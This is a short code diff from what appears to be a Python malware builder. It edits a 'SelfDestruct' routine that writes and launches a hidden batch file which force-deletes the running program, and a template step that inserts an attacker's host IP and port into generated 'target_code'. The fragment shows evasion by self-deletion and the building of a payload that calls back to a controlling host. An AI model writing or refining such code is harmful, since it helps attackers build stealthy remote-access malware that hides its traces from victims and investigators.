@@ -226,7 +226,10 @@ def SelfDestruct():
 
     # Run the batch file hidden
     try:
-        subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=0x08000000)
+        subprocess.Popen(
+        ['cmd.exe', '/c', 'start', '', '/min', bat_path],
+        creationflags=subprocess.CREATE_NEW_CONSOLE
+        )
         print(f"Batch file created at {bat_path} and executed.")
     except Exception as e:
         print(f"Error running batch file: {e}")
@@ -388,7 +391,7 @@ with open(filename, "w", encoding="utf-8") as f:
     f.write(textwrap.dedent(
         target_code.replace("-~-Host-~-", HostIP)
         .replace("-~-Port-~-", HostPort)
-        .replace("-~-bat-~-", '''""" 
+        .replace("-~-bat-~-", '''f""" 
 @echo off
 timeout /t 3 /nobreak >nul
 del /f /q "{path}"
